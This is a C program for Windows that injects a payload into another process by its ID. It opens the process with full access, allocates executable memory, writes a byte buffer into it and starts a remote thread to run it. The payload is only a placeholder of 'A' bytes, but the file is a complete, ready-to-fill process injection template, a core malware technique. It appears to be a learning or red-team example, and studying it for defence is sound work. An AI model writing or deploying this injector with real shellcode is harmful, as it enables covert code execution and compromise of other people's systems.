#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main(int argc, char* argv[]) {

    /* declaring some vars for later use */ 
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL;

    unsigned char cora[] = "\x41\x41\x41\x41\x41\x41";
    size_t coraSize = sizeof(cora);

    if (argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return EXIT_FAILURE;
    }

    dwPID = atoi(argv[1]);

    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    /* open a  handle to a process */
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

    if (hProcess == NULL) {
        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);
    
    /* allocate bytes to process memory */

    rBuffer = VirtualAllocEx(hProcess, NULL, coraSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, coraSize);

    /* write allocated memory to the process memory */

    WriteProcessMemory(hProcess, rBuffer, cora, sizeof(cora), NULL);
    printf("%s wrote %zd-bytes to the process memory\n", k, sizeof(cora));
    
    /* create thread to run our payload */
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);

    if (hThread == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }
    
    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished :>", k); 

    return EXIT_SUCCESS;

}